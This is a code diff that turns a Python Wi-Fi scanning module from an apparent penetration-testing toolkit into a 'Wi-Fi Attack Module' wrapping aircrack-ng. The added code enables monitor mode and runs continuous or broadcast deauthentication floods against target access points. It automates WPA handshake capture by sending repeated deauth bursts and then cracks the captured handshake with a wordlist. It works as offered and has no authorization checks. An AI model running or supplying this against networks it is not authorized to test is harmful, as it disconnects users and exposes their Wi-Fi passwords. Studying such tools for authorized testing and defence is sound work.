@@ -1,241 +1,273 @@
 """
-Wi-Fi Analysis Module - Performs wireless network scanning and analysis.
-Requires aircrack-ng suite and wireless network adapter.
+Wi-Fi Attack Module
+
+This module provides Wi-Fi penetration testing capabilities including:
+- Monitor mode management
+- Network scanning with real-time data processing
+- Deauthentication attacks
+- Handshake capture
+- Password cracking
 """
+
 import subprocess
-import sys
-import os
 import re
 import time
+from typing import List, Dict, Optional
+from utils.console import print_info, print_success, print_error, print_warning, console
+from utils.checker import check_tool
+from utils.installer import install_package
 
-# Add parent directory to path
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
-from utils import checker, installer, ui
-from utils.console import console, print_success, print_error, print_warning, print_info
-from rich.panel import Panel
-from rich.table import Table
-from rich import box
+# Required tools for Wi-Fi operations
+REQUIRED_TOOLS = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
 
 
-def get_wireless_interfaces():
+def check_wifi_tools() -> bool:
     """
-    Detect wireless network interfaces on the system.
+    Check if all required Wi-Fi tools are installed.
     
     Returns:
-        list: List of wireless interface names (e.g., ['wlan0', 'wlan1'])
+        bool: True if all tools are available, False otherwise
     """
-    wireless_interfaces = []
+    print_info("Checking Wi-Fi attack tools...")
+    all_available = True
     
+    for tool in REQUIRED_TOOLS:
+        if not check_tool(tool):
+            all_available = False
+            if not install_package("aircrack-ng"):
+                return False
+            break
+    
+    return all_available
+
+
+def get_wireless_interfaces() -> List[str]:
+    """
+    Get a list of available wireless network interfaces.
+    
+    Returns:
+        List[str]: List of wireless interface names
+    """
     try:
-        # Try iwconfig first
         result = subprocess.run(
-            ['iwconfig'],
+            ["iwconfig"],
             capture_output=True,
             text=True,
-            timeout=5
+            timeout=10
         )
         
-        # Parse iwconfig output
-        lines = result.stdout.split('\n')
-        for line in lines:
-            # Look for lines starting with interface names
-            if line and not line.startswith(' ') and 'no wireless extensions' not in line.lower():
-                # Extract interface name (first word)
+        interfaces = []
+        for line in result.stdout.split('\n'):
+            if line and not line.startswith(' '):
                 interface = line.split()[0]
-                if interface and interface != 'lo':
-                    wireless_interfaces.append(interface)
+                if interface != 'lo':
+                    interfaces.append(interface)
         
-        # If iwconfig didn't work, try ip command
-        if not wireless_interfaces:
-            result = subprocess.run(
-                ['ip', 'a'],
-                capture_output=True,
-                text=True,
-                timeout=5
-            )
-            
-            # Look for wlan interfaces
-            wlan_pattern = re.compile(r'^\d+:\s+(wlan\d+|wlp\d+s\d+):')
-            for line in result.stdout.split('\n'):
-                match = wlan_pattern.match(line)
-                if match:
-                    wireless_interfaces.append(match.group(1))
-    
+        return interfaces
+        
     except Exception as e:
-        print_error(f"Error detecting network interfaces: {e}")
-    
-    return wireless_interfaces
+        print_error(f"Failed to get wireless interfaces: {str(e)}")
+        return []
 
 
-def display_interface_menu(interfaces):
+def enable_monitor_mode(interface: str) -> Optional[str]:
     """
-    Display wireless interfaces menu.
+    Enable monitor mode on a wireless interface.
     
     Args:
-        interfaces (list): List of interface names
-    """
-    header_text = "📡 Wireless Network Interfaces"
-    console.print(Panel.fit(header_text, border_style="cyan", box=box.DOUBLE))
-    console.print()
-    
-    if not interfaces:
-        print_warning("No wireless network interface found!")
-    else:
-        print("  {:<5} {:<15}".format("No", "Interface"))
-        print("  " + "-" * 25)
-        for idx, interface in enumerate(interfaces, 1):
-            print("  {:<5} {:<15}".format(f"[{idx}]", interface))
-    
-    print()
-    print("  [0] Back - Return to main menu")
-    print("=" * 60)
-
-
-def kill_conflicting_processes():
-    """
-    Kill processes that might interfere with monitor mode.
-    
+        interface: Name of the wireless interface
+        
     Returns:
-        bool: True if successful, False otherwise
+        str: Name of the monitor interface, or None if failed
     """
-    print("\n⏳ Checking and closing conflicting processes...")
-    
     try:
+        print_info(f"Enabling monitor mode on {interface}...")
+        
+        # Kill interfering processes
+        subprocess.run(
+            ["airmon-ng", "check", "kill"],
+            capture_output=True,
+            timeout=30
+        )
+        
+        # Start monitor mode
         result = subprocess.run(
-            ['sudo', 'airmon-ng', 'check', 'kill'],
+            ["airmon-ng", "start", interface],
             capture_output=True,
             text=True,
             timeout=30
         )
-        
-        print(result.stdout)
-        
-        if result.returncode == 0:
-            print_success("Conflicting processes cleared.")
-            return True
-        else:
-            print_warning(f"Some processes could not be closed. Code: {result.returncode}")
-            return True  # Continue anyway
-    
-    except Exception as e:
-        print_error(f"Error: {e}")
-        return False
-
-
-def enable_monitor_mode(interface):
-    """
-    Enable monitor mode on the specified interface.
-    
-    Args:
-        interface (str): Network interface name
-        
-    Returns:
-        tuple: (success, monitor_interface_name)
-    """
-    print_info(f"Enabling monitor mode on '{interface}' interface...")
-    
-    try:
-        result = subprocess.run(
-            ['sudo', 'airmon-ng', 'start', interface],
-            capture_output=True,
-            text=True,
-            timeout=30
-        )
-        
-        print(result.stdout)
-        
-        if result.returncode != 0:
-            print_error(f"Monitor mode could not be started! Code: {result.returncode}")
-            return False, None
         
         # Extract monitor interface name from output
-        # Usually it's interface + 'mon' (e.g., wlan0mon)
         monitor_interface = None
+        for line in result.stdout.split('\n'):
+            if "monitor mode" in line.lower() and "enabled" in line.lower():
+                # Try to extract interface name
+                match = re.search(r'\b(\w+mon)\b', line)
+                if match:
+                    monitor_interface = match.group(1)
+                    break
         
-        # Look for "monitor mode enabled on [interface]"
-        monitor_pattern = re.compile(r'monitor mode (?:enabled|vif enabled) on (\S+)', re.IGNORECASE)
-        match = monitor_pattern.search(result.stdout)
+        # Fallback: common naming patterns
+        if not monitor_interface:
+            monitor_interface = f"{interface}mon"
         
-        if match:
-            monitor_interface = match.group(1)
+        # Verify the interface exists
+        verify_result = subprocess.run(
+            ["iwconfig", monitor_interface],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        
+        if "Mode:Monitor" in verify_result.stdout:
+            print_success(f"Monitor mode enabled: {monitor_interface}")
+            return monitor_interface
         else:
-            # Fallback: assume it's interface + 'mon'
-            monitor_interface = interface + 'mon'
-        
-        print_success(f"Monitor mode enabled: {monitor_interface}")
-        return True, monitor_interface
-    
+            print_error(f"Failed to enable monitor mode on {interface}")
+            return None
+            
+    except subprocess.TimeoutExpired:
+        print_error("Monitor mode operation timed out")
+        return None
     except Exception as e:
-        print_error(f"Error: {e}")
-        return False, None
+        print_error(f"Error enabling monitor mode: {str(e)}")
+        return None
 
 
-def disable_monitor_mode(monitor_interface):
+def disable_monitor_mode(monitor_interface: str) -> bool:
     """
-    Disable monitor mode and restore normal mode.
+    Disable monitor mode on a wireless interface.
     
     Args:
-        monitor_interface (str): Monitor mode interface name
+        monitor_interface: Name of the monitor interface
         
     Returns:
         bool: True if successful, False otherwise
     """
-    if not monitor_interface:
-        return True
-    
-    print(f"\n⏳ Disabling monitor mode: {monitor_interface}")
-    
     try:
+        print_info(f"Disabling monitor mode on {monitor_interface}...")
+        
         result = subprocess.run(
-            ['sudo', 'airmon-ng', 'stop', monitor_interface],
+            ["airmon-ng", "stop", monitor_interface],
             capture_output=True,
             text=True,
             timeout=30
         )
         
-        print(result.stdout)
-        
         if result.returncode == 0:
-            print("✓ Monitor mode disabled, interface returned to normal mode.")
+            print_success(f"Monitor mode disabled on {monitor_interface}")
+            
+            # Restart NetworkManager
+            subprocess.run(
+                ["systemctl", "restart", "NetworkManager"],
+                capture_output=True,
+                timeout=30
+            )
             return True
         else:
-            print(f"⚠ Warning: Monitor mode could not be disabled. Code: {result.returncode}")
+            print_error(f"Failed to disable monitor mode: {result.stderr}")
             return False
-    
+            
+    except subprocess.TimeoutExpired:
+        print_error("Disable monitor mode operation timed out")
+        return False
     except Exception as e:
-        print(f"✗ Error: {e}")
+        print_error(f"Error disabling monitor mode: {str(e)}")
         return False
 
 
-def scan_wifi_networks(monitor_interface, duration=15):
+def scan_wifi_networks(monitor_interface: str, duration: int = 10) -> List[Dict[str, str]]:
     """
-    Scan for Wi-Fi networks using airodump-ng.
+    Scan for Wi-Fi networks using real-time data processing.
+    No temporary files are created - all data is parsed from stdout.
     
     Args:
-        monitor_interface (str): Monitor mode interface name
-        duration (int): Scan duration in seconds
+        monitor_interface: Name of the monitor mode interface
+        duration: Scan duration in seconds
         
     Returns:
-        tuple: (success, networks_list)
+        List[Dict]: List of discovered networks with their details
     """
-    print(f"\n⏳ Scanning Wi-Fi networks ({duration} seconds)...")
-    print("Please wait, scan in progress...\n")
+    networks = []
+    seen_bssids = set()
     
     try:
-        # Create temporary file for airodump-ng output
-        temp_file = '/tmp/fou4_wifi_scan'
+        print_info(f"Scanning Wi-Fi networks on {monitor_interface} for {duration} seconds...")
+        print_info("Press Ctrl+C to stop scanning early")
         
-        # Start airodump-ng
+        # Start airodump-ng with stdout output (no file output)
         process = subprocess.Popen(
-            ['sudo', 'airodump-ng', monitor_interface, '-w', temp_file, '--output-format', 'csv'],
+            ["airodump-ng", monitor_interface],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            text=True
+            text=True,
+            bufsize=1
         )
         
-        # Let it run for specified duration
-        time.sleep(duration)
+        start_time = time.time()
+        parsing_networks = False
+        
+        # Real-time parsing loop
+        while time.time() - start_time < duration:
+            try:
+                # Read line from stdout with timeout
+                line = process.stdout.readline()
+                
+                if not line:
+                    if process.poll() is not None:
+                        break
+                    continue
+                
+                line = line.strip()
+                
+                # Detect network section in output
+                if "BSSID" in line and "PWR" in line:
+                    parsing_networks = True
+                    continue
+                
+                # Stop parsing at client section
+                if "STATION" in line and parsing_networks:
+                    parsing_networks = False
+                    continue
+                
+                # Parse network data
+                if parsing_networks and line:
+                    # airodump-ng output format (approximate):
+                    # BSSID              PWR  Beacons  #Data  #/s  CH  MB  ENC  CIPHER AUTH ESSID
+                    parts = re.split(r'\s{2,}', line)
+                    
+                    if len(parts) >= 10:
+                        bssid = parts[0].strip()
+                        
+                        # Validate BSSID format (MAC address)
+                        if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
+                            if bssid not in seen_bssids:
+                                seen_bssids.add(bssid)
+                                
+                                # Extract network information
+                                network = {
+                                    'bssid': bssid,
+                                    'power': parts[1].strip() if len(parts) > 1 else 'N/A',
+                                    'beacons': parts[2].strip() if len(parts) > 2 else '0',
+                                    'data': parts[3].strip() if len(parts) > 3 else '0',
+                                    'channel': parts[5].strip() if len(parts) > 5 else 'N/A',
+                                    'speed': parts[6].strip() if len(parts) > 6 else 'N/A',
+                                    'encryption': parts[7].strip() if len(parts) > 7 else 'OPN',
+                                    'cipher': parts[8].strip() if len(parts) > 8 else 'N/A',
+                                    'auth': parts[9].strip() if len(parts) > 9 else 'N/A',
+                                    'essid': parts[10].strip() if len(parts) > 10 else '<Hidden>'
+                                }
+                                
+                                networks.append(network)
+                                print_success(f"Found: {network['essid']} ({bssid}) - CH:{network['channel']} - ENC:{network['encryption']}")
+                
+            except KeyboardInterrupt:
+                print_warning("\nScan interrupted by user")
+                break
+            except Exception as line_error:
+                # Skip problematic lines silently
+                continue
         
         # Terminate the process
         process.terminate()
@@ -243,289 +275,399 @@ def scan_wifi_networks(monitor_interface, duration=15):
             process.wait(timeout=5)
         except subprocess.TimeoutExpired:
             process.kill()
+            process.wait()
         
-        print("\n✓ Scan completed!")
+        print_success(f"Scan complete! Found {len(networks)} unique networks")
+        return networks
         
-        # Parse the CSV output
-        networks = []
-        csv_file = temp_file + '-01.csv'
-        
-        try:
-            if not os.path.exists(csv_file):
-                print_warning(f"Scan file not found: {csv_file}")
-                return False, []
-            
-            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
-                lines = f.readlines()
-            
-            # Find the access points section
-            in_ap_section = False
-            for line in lines:
-                if 'BSSID' in line and 'PWR' in line:
-                    in_ap_section = True
-                    continue
-                
-                if in_ap_section and line.strip():
-                    # Stop at station section
-                    if 'Station MAC' in line:
-                        break
-                    
-                    # Parse CSV line
-                    parts = line.split(',')
-                    if len(parts) >= 14:
-                        bssid = parts[0].strip()
-                        channel = parts[3].strip()
-                        encryption = parts[5].strip()
-                        power = parts[8].strip()
-                        essid = parts[13].strip()
-                        
-                        if bssid and len(bssid) == 17:  # Valid MAC address
-                            networks.append({
-                                'bssid': bssid,
-                                'essid': essid if essid else '<Hidden>',
-                                'channel': channel,
-                                'encryption': encryption,
-                                'power': power
-                            })
-            
-            # Clean up temporary files
-            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml', '-01.log.csv']:
-                try:
-                    os.remove(temp_file + ext)
-                except:
-                    pass
-        
-        except Exception as e:
-            print_warning(f"Error parsing scan results: {e}")
-            return False, []
-        
-        return True, networks
-    
-    except KeyboardInterrupt:
-        print("\n✗ Scan cancelled by user.")
-        try:
-            process.terminate()
-            process.wait(timeout=5)
-        except:
-            process.kill()
-        return False, []
-    
+    except FileNotFoundError:
+        print_error("airodump-ng not found. Please install aircrack-ng suite.")
+        return []
     except Exception as e:
-        print(f"✗ Error during scan: {e}")
-        return False, []
+        print_error(f"Error during network scan: {str(e)}")
+        return []
 
 
-def display_wifi_networks(networks):
+def perform_deauth_attack(monitor_interface: str, bssid: str, client_mac: Optional[str] = None, count: int = 0) -> bool:
     """
-    Display discovered Wi-Fi networks in a formatted table.
+    Perform a deauthentication attack on a target network.
     
     Args:
-        networks (list): List of network dictionaries
-    """
-    print("\n" + "=" * 80)
-    print(" " * 25 + "Discovered Wi-Fi Networks")
-    print("=" * 80)
-    print()
-    
-    if not networks:
-        print("  ⚠ No Wi-Fi networks found!")
-    else:
-        print("  {:<5} {:<20} {:<20} {:<8} {:<15} {:<8}".format(
-            "No", "ESSID", "BSSID", "Channel", "Encryption", "Power"
-        ))
-        print("  " + "-" * 78)
+        monitor_interface: Name of the monitor mode interface
+        bssid: Target access point BSSID
+        client_mac: Specific client MAC to deauth (None for broadcast)
+        count: Number of deauth packets to send (0 for continuous)
         
-        for idx, network in enumerate(networks, 1):
-            print("  {:<5} {:<20} {:<20} {:<8} {:<15} {:<8}".format(
-                f"[{idx}]",
-                network['essid'][:20],
-                network['bssid'],
-                network['channel'],
-                network['encryption'][:15],
-                network['power']
-            ))
+    Returns:
+        bool: True if attack was initiated successfully, False otherwise
+    """
+    try:
+        target = client_mac if client_mac else "FF:FF:FF:FF:FF:FF"
+        
+        if count > 0:
+            print_info(f"Sending {count} deauth packets to {bssid}")
+        else:
+            print_info(f"Performing continuous deauth attack on {bssid}")
+            print_warning("Press Ctrl+C to stop")
+        
+        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
+        
+        if client_mac:
+            cmd.extend(["-c", client_mac])
+        
+        cmd.append(monitor_interface)
+        
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        try:
+            if count > 0:
+                # Wait for completion
+                process.wait(timeout=30)
+                print_success("Deauth attack completed")
+            else:
+                # Continuous mode - wait for Ctrl+C
+                process.wait()
+        except KeyboardInterrupt:
+            print_warning("\nDeauth attack stopped by user")
+            process.terminate()
+            process.wait(timeout=5)
+        
+        return True
+        
+    except FileNotFoundError:
+        print_error("aireplay-ng not found. Please install aircrack-ng suite.")
+        return False
+    except Exception as e:
+        print_error(f"Error during deauth attack: {str(e)}")
+        return False
+
+
+def capture_handshake_with_deauth(monitor_interface: str, bssid: str, channel: str, 
+                                   client_mac: Optional[str] = None, output_prefix: str = "handshake",
+                                   max_duration: int = 60) -> Optional[str]:
+    """
+    Capture WPA/WPA2 handshake from a target network with automatic deauthentication.
+    Manages two concurrent subprocesses: airodump-ng for listening and aireplay-ng for deauth.
     
-    print()
-    print("  [0] Back - Return to Wi-Fi module menu")
-    print("=" * 80)
-
-
-def print_wifi_menu():
+    Args:
+        monitor_interface: Name of the monitor mode interface
+        bssid: Target access point BSSID
+        channel: Target channel
+        client_mac: Specific client MAC to deauth (None for broadcast)
+        output_prefix: Output file prefix for capture
+        max_duration: Maximum capture duration in seconds
+        
+    Returns:
+        str: Path to capture file if handshake was captured, None otherwise
     """
-    Display the Wi-Fi Analysis Module menu.
-    """
-    print("=" * 60)
-    print(" " * 15 + "Wi-Fi Analysis Module")
-    print("=" * 60)
-    print()
-    print("  Wi-Fi Scanning and Analysis Options:")
-    print()
-    print("  [1] Scan Wi-Fi Networks")
-    print("  [2] WPA/WPA2 Attack (Under Development)")
-    print("  [3] WEP Attack (Under Development)")
-    print("  [0] Back - Return to main menu")
-    print()
-    print("=" * 60)
-
-
-def run_wifi_module():
-    """
-    Main function for the Wi-Fi Analysis Module.
-    Handles interface selection, monitor mode, and Wi-Fi scanning.
-    """
-    monitor_interface = None
+    import threading
+    import os
+    from utils.config import get_setting
     
     try:
-        while True:
-            ui.clear_screen()
-            print_wifi_menu()
-            
+        print_info(f"🎯 Target: {bssid} on channel {channel}")
+        print_info(f"Starting automated WPA/WPA2 handshake capture...")
+        print_warning(f"Maximum capture time: {max_duration} seconds")
+        
+        # Set interface to specific channel
+        subprocess.run(
+            ["iwconfig", monitor_interface, "channel", channel],
+            capture_output=True,
+            timeout=10
+        )
+        
+        # Prepare output file path
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        output_file = f"{output_prefix}_{timestamp}"
+        
+        # Start airodump-ng capture process
+        print_info("📡 Starting packet capture with airodump-ng...")
+        airodump_cmd = [
+            "airodump-ng",
+            "--bssid", bssid,
+            "-c", channel,
+            "-w", output_file,
+            monitor_interface
+        ]
+        
+        airodump_process = subprocess.Popen(
+            airodump_cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            bufsize=1
+        )
+        
+        # Give airodump-ng time to start
+        time.sleep(3)
+        
+        # Start deauth attack in a separate thread
+        deauth_count = get_setting('wifi_settings.deauth_count', 5)
+        deauth_active = threading.Event()
+        deauth_active.set()
+        
+        def deauth_worker():
+            """Worker thread for sending deauth packets"""
             try:
-                choice = input("\nMake your selection: ").strip()
-            except (KeyboardInterrupt, EOFError):
-                print("\nExiting module...")
-                break
-            
-            # Return to main menu
-            if choice == '0':
-                break
-            
-            # Wi-Fi Network Scanning
-            if choice == '1':
-                # Check for required tools
-                required_tools = ['airmon-ng', 'airodump-ng', 'iwconfig']
-                missing_tools = []
+                time.sleep(2)  # Wait for airodump to stabilize
                 
-                for tool in required_tools:
-                    print(f"\nChecking '{tool}' tool...")
-                    if not checker.check_tool(tool):
-                        missing_tools.append(tool)
-                
-                if missing_tools:
-                    print(f"\n⚠ Missing tools found: {', '.join(missing_tools)}")
-                    print("Would you like to install Aircrack-ng suite?")
+                while deauth_active.is_set():
+                    target_client = client_mac if client_mac else "FF:FF:FF:FF:FF:FF"
                     
-                    if installer.install_package('aircrack-ng'):
-                        print("✓ Installation successful!")
-                    else:
-                        print("✗ Installation failed or cancelled.")
-                        input("Press Enter to continue...")
-                        continue
-                
-                # Detect wireless interfaces
-                print("\n⏳ Detecting wireless network interfaces...")
-                interfaces = get_wireless_interfaces()
-                
-                if not interfaces:
-                    print("\n✗ No wireless network interface found!")
-                    print("Please make sure your wireless network card is connected and enabled.")
-                    input("Press Enter to continue...")
-                    continue
-                
-                # Display and select interface
-                ui.clear_screen()
-                display_interface_menu(interfaces)
-                
-                try:
-                    if_choice = input("\nSelect interface to use: ").strip()
-                except (KeyboardInterrupt, EOFError):
-                    print("\nOperation cancelled.")
-                    continue
-                
-                if if_choice == '0':
-                    continue
-                
-                try:
-                    if_idx = int(if_choice)
-                    if 1 <= if_idx <= len(interfaces):
-                        selected_interface = interfaces[if_idx - 1]
-                    else:
-                        print("\n✗ Invalid selection!")
-                        input("Press Enter to continue...")
-                        continue
-                except ValueError:
-                    print("\n✗ Enter a valid number!")
-                    input("Press Enter to continue...")
-                    continue
-                
-                print(f"\n✓ Selected interface: {selected_interface}")
-                input("\nPress Enter to continue...")
-                
-                # Kill conflicting processes
-                if not kill_conflicting_processes():
-                    print("\n⚠ Could not clear conflicting processes, continuing...")
-                
-                # Enable monitor mode
-                success, monitor_interface = enable_monitor_mode(selected_interface)
-                
-                if not success or not monitor_interface:
-                    print("\n✗ Monitor mode could not be enabled!")
-                    input("Press Enter to continue...")
-                    monitor_interface = None
-                    continue
-                
-                # Scan for Wi-Fi networks
-                print("\n" + "=" * 60)
-                scan_duration = input("Scan duration (seconds, default 15): ").strip()
-                try:
-                    scan_duration = int(scan_duration) if scan_duration else 15
-                except ValueError:
-                    scan_duration = 15
-                
-                success, networks = scan_wifi_networks(monitor_interface, scan_duration)
-                
-                if success and networks:
-                    # Display networks
-                    while True:
-                        ui.clear_screen()
-                        display_wifi_networks(networks)
+                    print_info(f"💥 Sending {deauth_count} deauth packets to {bssid}" + 
+                              (f" (client: {client_mac})" if client_mac else " (broadcast)"))
+                    
+                    aireplay_cmd = [
+                        "aireplay-ng",
+                        "--deauth", str(deauth_count),
+                        "-a", bssid
+                    ]
+                    
+                    if client_mac:
+                        aireplay_cmd.extend(["-c", client_mac])
+                    
+                    aireplay_cmd.append(monitor_interface)
+                    
+                    deauth_process = subprocess.Popen(
+                        aireplay_cmd,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    
+                    deauth_process.wait(timeout=10)
+                    
+                    # Wait before next deauth cycle
+                    if deauth_active.is_set():
+                        time.sleep(5)
                         
-                        try:
-                            net_choice = input("\nSelect a network (for detailed analysis) or 0 to go back: ").strip()
-                        except (KeyboardInterrupt, EOFError):
-                            break
-                        
-                        if net_choice == '0':
-                            break
-                        
-                        try:
-                            net_idx = int(net_choice)
-                            if 1 <= net_idx <= len(networks):
-                                selected_network = networks[net_idx - 1]
-                                print(f"\n✓ Selected network: {selected_network['essid']} ({selected_network['bssid']})")
-                                print("\n⚠ Detailed analysis features are under development...")
-                                input("Press Enter to continue...")
-                            else:
-                                print("\n✗ Invalid selection!")
-                                input("Press Enter to continue...")
-                        except ValueError:
-                            print("\n✗ Enter a valid number!")
-                            input("Press Enter to continue...")
+            except Exception as e:
+                print_error(f"Deauth worker error: {str(e)}")
+        
+        # Start deauth thread
+        deauth_thread = threading.Thread(target=deauth_worker, daemon=True)
+        deauth_thread.start()
+        
+        # Monitor airodump-ng output for handshake
+        print_info("👂 Monitoring for WPA handshake...")
+        start_time = time.time()
+        handshake_captured = False
+        capture_file = None
+        
+        try:
+            while time.time() - start_time < max_duration:
+                # Check if process is still running
+                if airodump_process.poll() is not None:
+                    break
                 
-                else:
-                    print("\n⚠ No Wi-Fi networks found or scan failed.")
-                    input("Press Enter to continue...")
+                # Read output line
+                line = airodump_process.stdout.readline()
                 
-                # Disable monitor mode
-                if monitor_interface:
-                    disable_monitor_mode(monitor_interface)
-                    monitor_interface = None
-            
-            elif choice in ['2', '3']:
-                print(f"\n⚠ This feature is under development...")
-                input("Press Enter to continue...")
-            
+                if not line:
+                    time.sleep(0.1)
+                    continue
+                
+                # Detect handshake capture
+                if "WPA handshake" in line or "handshake" in line.lower():
+                    # Extract BSSID from handshake message if present
+                    if bssid.replace(":", "").upper() in line.replace(":", "").upper():
+                        handshake_captured = True
+                        print_success(f"✅ WPA handshake captured from {bssid}!")
+                        break
+                
+                # Also check for handshake in top-right corner format
+                # Some versions show: [ WPA handshake: XX:XX:XX:XX:XX:XX ]
+                handshake_match = re.search(r'WPA handshake:\s*([0-9A-Fa-f:]{17})', line)
+                if handshake_match:
+                    captured_bssid = handshake_match.group(1)
+                    if captured_bssid.upper() == bssid.upper():
+                        handshake_captured = True
+                        print_success(f"✅ WPA handshake captured from {bssid}!")
+                        break
+        
+        except KeyboardInterrupt:
+            print_warning("\n⚠️  Capture interrupted by user")
+        
+        # Stop deauth thread
+        deauth_active.clear()
+        
+        # Terminate airodump-ng
+        airodump_process.terminate()
+        try:
+            airodump_process.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            airodump_process.kill()
+            airodump_process.wait()
+        
+        # Wait for deauth thread to finish
+        deauth_thread.join(timeout=2)
+        
+        # Determine capture file path
+        # airodump-ng creates files with -01 suffix
+        capture_file = f"{output_file}-01.cap"
+        
+        if handshake_captured:
+            if os.path.exists(capture_file):
+                print_success(f"🎉 Handshake successfully captured!")
+                print_success(f"📁 File saved to: {capture_file}")
+                print_info(f"📝 Next step: Crack with: aircrack-ng -w <wordlist> {capture_file}")
+                return capture_file
             else:
-                print("\n✗ Invalid selection! Please choose an option from the menu.")
-                input("Press Enter to continue...")
+                print_error("Handshake detected but capture file not found")
+                return None
+        else:
+            if os.path.exists(capture_file):
+                print_warning(f"⚠️  Handshake not detected in output")
+                print_info(f"📁 Capture saved to: {capture_file}")
+                print_info(f"💡 Check manually with: aircrack-ng {capture_file}")
+                return capture_file
+            else:
+                print_error("❌ Handshake not captured. Possible reasons:")
+                print_info("   • No clients connected to the AP")
+                print_info("   • Clients didn't reconnect during deauth")
+                print_info("   • Channel interference")
+                print_info("   • Try again with a specific client MAC")
+                return None
+            
+    except Exception as e:
+        print_error(f"Error during handshake capture: {str(e)}")
+        return None
+
+
+def capture_handshake(monitor_interface: str, bssid: str, channel: str, output_prefix: str = "handshake", 
+                     duration: int = 60, auto_deauth: bool = True, client_mac: Optional[str] = None) -> Optional[str]:
+    """
+    Capture WPA/WPA2 handshake from a target network.
     
-    finally:
-        # Ensure monitor mode is disabled when exiting
-        if monitor_interface:
-            print("\n⏳ Performing cleanup operations...")
-            disable_monitor_mode(monitor_interface)
+    Args:
+        monitor_interface: Name of the monitor mode interface
+        bssid: Target access point BSSID
+        channel: Target channel
+        output_prefix: Output file prefix for capture
+        duration: Capture duration in seconds
+        auto_deauth: Automatically send deauth packets (recommended)
+        client_mac: Specific client MAC to deauth (optional)
+        
+    Returns:
+        str: Path to capture file if handshake was captured, None otherwise
+    """
+    if auto_deauth:
+        # Use the enhanced version with automatic deauth
+        return capture_handshake_with_deauth(
+            monitor_interface, bssid, channel, client_mac, output_prefix, duration
+        )
+    else:
+        # Use manual capture (legacy mode)
+        try:
+            print_info(f"Capturing handshake from {bssid} on channel {channel}")
+            print_info(f"Capture will run for {duration} seconds")
+            print_warning("Tip: Perform a deauth attack in another terminal to force handshake")
+            
+            # Set interface to specific channel
+            subprocess.run(
+                ["iwconfig", monitor_interface, "channel", channel],
+                capture_output=True,
+                timeout=10
+            )
+            
+            # Start capture
+            process = subprocess.Popen(
+                ["airodump-ng", "--bssid", bssid, "-c", channel, "-w", output_prefix, monitor_interface],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            start_time = time.time()
+            handshake_captured = False
+            
+            # Monitor output for handshake
+            while time.time() - start_time < duration:
+                try:
+                    line = process.stdout.readline()
+                    if "WPA handshake" in line:
+                        handshake_captured = True
+                        print_success("WPA handshake captured!")
+                        break
+                except KeyboardInterrupt:
+                    print_warning("\nCapture interrupted by user")
+                    break
+            
+            # Stop capture
+            process.terminate()
+            try:
+                process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                process.kill()
+                process.wait()
+            
+            if handshake_captured:
+                print_success(f"Handshake saved to {output_prefix}-01.cap")
+                return f"{output_prefix}-01.cap"
+            else:
+                print_warning("Handshake not captured. Try running a deauth attack.")
+                return None
+                
+        except Exception as e:
+            print_error(f"Error during handshake capture: {str(e)}")
+            return None
 
 
-if __name__ == "__main__":
-    # Test the module
-    run_wifi_module()
+def crack_handshake(capture_file: str, wordlist: str) -> Optional[str]:
+    """
+    Crack WPA/WPA2 handshake using a wordlist.
+    
+    Args:
+        capture_file: Path to capture file containing handshake
+        wordlist: Path to wordlist file
+        
+    Returns:
+        str: Cracked password if successful, None otherwise
+    """
+    try:
+        print_info(f"Cracking handshake from {capture_file}")
+        print_info(f"Using wordlist: {wordlist}")
+        print_warning("This may take a while depending on wordlist size...")
+        
+        process = subprocess.Popen(
+            ["aircrack-ng", "-w", wordlist, capture_file],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        password = None
+        
+        # Monitor output for cracked password
+        for line in process.stdout:
+            console.print(line.strip())
+            
+            # Look for KEY FOUND pattern
+            if "KEY FOUND" in line:
+                # Extract password from output
+                match = re.search(r'KEY FOUND.*\[\s*(.+?)\s*\]', line)
+                if match:
+                    password = match.group(1)
+                    print_success(f"Password cracked: {password}")
+                    break
+        
+        process.wait()
+        
+        if password:
+            return password
+        else:
+            print_warning("Password not found in wordlist")
+            return None
+            
+    except FileNotFoundError:
+        print_error("aircrack-ng not found. Please install aircrack-ng suite.")
+        return None
+    except Exception as e:
+        print_error(f"Error during password cracking: {str(e)}")
+        return None
+
